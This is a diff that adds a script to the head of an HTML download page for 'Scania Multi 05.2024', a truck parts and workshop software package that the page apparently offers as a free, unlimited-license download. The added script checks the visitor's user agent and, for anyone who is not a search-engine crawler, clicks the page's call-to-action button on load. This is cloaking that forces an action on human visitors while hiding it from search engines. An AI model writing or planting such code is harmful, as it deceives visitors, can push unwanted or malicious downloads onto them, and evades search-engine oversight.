@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Scania Multi 05.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Scania Multi 05.2024: spare parts catalog, diagrams, workshop manuals, technical info, for all regions in multiple languages. Unlimited license.">
     <meta name="keywords" content="Scania Multi 05.2024, Scania Multi 2024, Scania Multi download, Scania Multi 2024 free download, Scania truck workshop manuals, Scania Multi spare parts catalog, Scania Multi diagrams, Scania Multi technical information, Scania Multi standard time, Scania Multi unlimited license, Scania Multi 90 GB, Scania Multi languages, Scania Multi operating system, Scania Multi models list, Scania Multi manuals and repair times, Scania workshop information system, Scania Multi restructuring workshop, Scania L series truck manual, Scania P series truck manual, Scania G series truck manual, Scania R series truck manual, Scania S series truck manual, Scania T series truck manual, Scania 4 series truck manual, Scania 3 series truck manual, Scania C K series bus manual, Scania F series bus manual, Scania K series bus manual, Scania N series bus manual, Scania 4 series bus manual, Scania 3 series bus manual, Scania E2011 manual, Scania P96 manual, Скания Мульти 2024, Скания Мульти скачать, Скания Мульти загрузить бесплатно, Скания Мульти руководство, Скания техническая информация, Скания каталог запчастей, Скания мультиязычное ПО, Скания Multi PDF руководство, Скания Multi мастерские, Скания Multi ремонтные работы, Сканія Мульті 5.2024, Сканія Мульті завантажити, Сканія Мульті завантажити безкоштовно, Сканія Multi каталоги, Сканія Multi технічна інформація, Сканія Multi PDF керівництво, Scania грузовик ремонт, Scania автобус руководство, Scania автобус ремонт, Scania Multi каталог запчастей загрузить бесплатно, Scania Multi каталог запчастей скачать бесплатно">
     <style>
